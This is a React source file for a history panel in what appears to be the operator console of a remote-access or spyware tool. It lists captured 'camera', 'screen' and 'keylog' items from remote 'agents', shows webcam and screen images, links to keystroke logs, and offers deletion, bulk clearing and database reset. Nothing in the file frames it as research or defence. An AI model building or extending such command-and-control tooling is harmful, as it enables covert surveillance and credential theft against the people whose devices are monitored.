import { useEffect, useState } from 'react'

type Item = { id: string; ts: string; agent_id: string; kind: string; storage_url: string; size_bytes?: number; width?: number; height?: number }

export default function HistoryPanel({ open, onClose, agentId: fixedAgentId }: { open: boolean; onClose: () => void; agentId?: string }) {
  const [items, setItems] = useState<Item[]>([])
  const [agents, setAgents] = useState<Array<{ agent_id: string; name?: string; alias?: string }>>([])
  const [kind, setKind] = useState<string>('')
  const [agentId, setAgentId] = useState<string>('')
  const [selected, setSelected] = useState<Set<string>>(new Set())

  const apiBase = (import.meta as any).env?.VITE_MASTER_API_URL || (typeof window !== 'undefined' ? window.location.origin : '')
  const token = (typeof localStorage !== 'undefined' ? localStorage.getItem('master_token') : null) || ''

  const load = async () => {
    const params = new URLSearchParams()
    if (kind) params.set('kind', kind)
    let sel = (agentId || '').trim()
    if (sel) {
      // Map alias/name to agent_id if needed (case-insensitive exact)
      const found = agents.find(a => a.agent_id === sel) || agents.find(a => (a.alias || '').toLowerCase() === sel.toLowerCase() || (a.name || '').toLowerCase() === sel.toLowerCase())
      if (found) sel = found.agent_id
      params.set('agent_id', sel)
    }
    try {
      const r = await fetch(`${apiBase}/admin/history?${params.toString()}`, { headers: { Authorization: `Bearer ${token}` } })
      const j = await r.json()
      setItems(Array.isArray(j?.items) ? j.items : [])
      setSelected(new Set())
    } catch {}
  }

  useEffect(() => { if (open) { if (fixedAgentId) setAgentId(fixedAgentId); load(); (async ()=>{ try { const r = await fetch(`${apiBase}/agents`); const j = await r.json(); if (Array.isArray(j)) setAgents(j as any); } catch {} })(); } }, [open, fixedAgentId])

  const toggle = (id: string) => setSelected(prev => { const n = new Set(prev); if (n.has(id)) n.delete(id); else n.add(id); return n })

  const delSelected = async () => {
    for (const id of selected) {
      try { await fetch(`${apiBase}/admin/history/${encodeURIComponent(id)}`, { method: 'DELETE', headers: { Authorization: `Bearer ${token}` } }) } catch {}
    }
    load()
  }

  const clearAll = async () => {
    try { await fetch(`${apiBase}/admin/history/clear`, { method: 'POST', headers: { 'Content-Type': 'application/json', Authorization: `Bearer ${token}` }, body: JSON.stringify({}) }) } catch {}
    load()
  }

  const clearKind = async () => {
    let sel = (agentId || '').trim()
    if (sel) {
      const found = agents.find(a => a.agent_id === sel) || agents.find(a => (a.alias || '').toLowerCase() === sel.toLowerCase() || (a.name || '').toLowerCase() === sel.toLowerCase())
      if (found) sel = found.agent_id
    }
    try { await fetch(`${apiBase}/admin/history/clear`, { method: 'POST', headers: { 'Content-Type': 'application/json', Authorization: `Bearer ${token}` }, body: JSON.stringify({ kind: kind || undefined, agent_id: sel || undefined }) }) } catch {}
    load()
  }

  const resetDb = async () => {
    if (!confirm('Reset DB schema? This will drop and recreate tables.')) return
    try { await fetch(`${apiBase}/admin/db/reset`, { method: 'POST', headers: { Authorization: `Bearer ${token}` } }) } catch {}
    load()
  }

  return (
    <div style={{ position: 'fixed', top: 0, right: 0, bottom: 0, width: open ? 'min(520px, 100vw)' : 0, background: '#0f0f0f', borderLeft: '1px solid #222', overflow: 'hidden', transition: 'width 0.2s ease', zIndex: 1000 }}>
      <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', padding: 10, borderBottom: '1px solid #222', gap: 6, flexWrap: 'wrap' }}>
        <div style={{ color: '#9efc9e' }}>History</div>
        <div style={{ display: 'flex', gap: 6, flexWrap: 'wrap' }}>
          <button className="btn secondary" onClick={load}>Refresh</button>
          <button className="btn secondary" onClick={delSelected} disabled={selected.size===0}>Delete Selected</button>
          <button className="btn secondary" onClick={clearKind}>Clear Kind</button>
          <button className="btn secondary" onClick={clearAll}>Clear All</button>
          <button className="btn secondary" onClick={resetDb}>Reset DB</button>
          <button className="btn" onClick={onClose}>Close</button>
        </div>
      </div>
      <div style={{ padding: 10, display: 'flex', flexDirection: 'column', gap: 10, height: 'calc(100% - 48px)' }}>
        <div style={{ display: 'flex', gap: 6, flexWrap: 'wrap' }}>
          <select className="input" style={{ width: 150 }} value={kind} onChange={(e)=>setKind(e.target.value)}>
            <option value="">(all kinds)</option>
            <option value="camera">camera</option>
            <option value="screen">screen</option>
            <option value="keylog">keylog</option>
          </select>
          {!fixedAgentId ? (
            <>
              <input list="agents-list" className="input" style={{ minWidth: 240 }} value={agentId} onChange={(e)=>setAgentId(e.target.value)} placeholder="agent id, alias, or name" />
              <datalist id="agents-list">
                {agents.map((a)=>{
                  const label = (a as any).alias || a.name || a.agent_id
                  return (
                    <>
                      <option key={`${a.agent_id}-id`} value={a.agent_id}>{label} • {a.agent_id}</option>
                      {a.alias ? <option key={`${a.agent_id}-alias`} value={a.alias}>{a.alias} • {a.agent_id}</option> : null}
                      {a.name && a.name !== a.alias ? <option key={`${a.agent_id}-name`} value={a.name}>{a.name} • {a.agent_id}</option> : null}
                    </>
                  )
                })}
              </datalist>
            </>
          ) : (
            <input className="input" value={agentId} readOnly />
          )}
          <button className="btn" onClick={load}>Filter</button>
        </div>
        <div style={{ flex: 1, minHeight: 0, border: '1px solid #222', borderRadius: 6, padding: 8, background: '#0b0b0b', overflowY: 'auto' }}>
          {items.length === 0 && <div style={{ color: '#777' }}>(no items)</div>}
          <div style={{ display: 'grid', gridTemplateColumns: '24px 1fr auto', gap: 8 }}>
            {items.map((it) => (
              <div key={it.id} style={{ display: 'contents' }}>
                <input type="checkbox" checked={selected.has(it.id)} onChange={()=>toggle(it.id)} />
                <div>
                  <div style={{ color: '#ddd', fontSize: 13 }}>{it.kind} • {new Date(it.ts).toLocaleString()} • {it.agent_id}</div>
                  <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginTop: 6 }}>
                    {it.kind !== 'keylog' ? (
                      <img src={it.storage_url} alt="media" style={{ maxWidth: 160, maxHeight: 90, border: '1px solid #222', borderRadius: 4 }} />
                    ) : (
                      <a href={it.storage_url} target="_blank" rel="noreferrer" style={{ color: '#9efc9e', fontSize: 12 }}>open keylog</a>
                    )}
                    <div style={{ color: '#777', fontSize: 12 }}>size: {it.size_bytes || 0} • {it.width || '?'}x{it.height || '?'}</div>
                  </div>
                </div>
                <div style={{ display: 'flex', gap: 6, alignItems: 'center' }}>
                    <a href={it.storage_url} className="btn secondary" target="_blank" rel="noreferrer">Open</a>
                </div>
              </div>
            ))}
          </div>
        </div>
      </div>
    </div>
  )
}